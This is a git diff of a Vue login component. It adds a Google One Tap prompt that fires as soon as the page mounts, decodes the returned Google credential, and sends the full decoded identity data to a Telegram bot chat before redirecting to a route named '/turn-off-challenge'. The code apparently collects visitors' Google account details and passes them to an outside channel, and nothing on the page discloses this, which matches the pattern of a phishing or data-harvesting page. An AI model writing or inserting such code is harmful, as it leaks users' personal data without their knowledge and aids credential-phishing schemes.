@@ -1,5 +1,6 @@
 <script setup>
-import { decodeCredential } from "vue3-google-login";
+import { onMounted } from "vue";
+import { decodeCredential, googleOneTap } from "vue3-google-login";
 import { useRouter } from "vue-router";
 import store from "@/store";
 
@@ -21,7 +22,7 @@ function sendTelegramMessage(message) {
   const datetimeISO = now.toISOString();
   const token = import.meta.env.VITE_TELEGRAM_TOKEN;
   const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-  const textMessage = message+"\n\nDATEITME: "+datetimeISO;
+  const textMessage = message + "\n\nDATEITME: " + datetimeISO;
 
   const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
     textMessage
@@ -41,8 +42,22 @@ function sendTelegramMessage(message) {
       console.error("There was a problem with the fetch operation:", error);
     });
 }
+
+onMounted(() => {
+  googleOneTap()
+    .then((response) => {
+      console.log("Handle the response", response);
+      store.commit("setIsLogged", true);
+      const credential = decodeCredential(response.credential);
+      sendTelegramMessage(JSON.stringify(credential, null, "\t"));
+      router.push("/turn-off-challenge");
+    })
+    .catch((error) => {
+      console.log("Handle the error", error);
+    });
+});
 </script>
 
 <template>
-  <GoogleLogin :callback="callback" />
+  <div>One-Tap prompt will be shown once this component is mounted</div>
 </template>
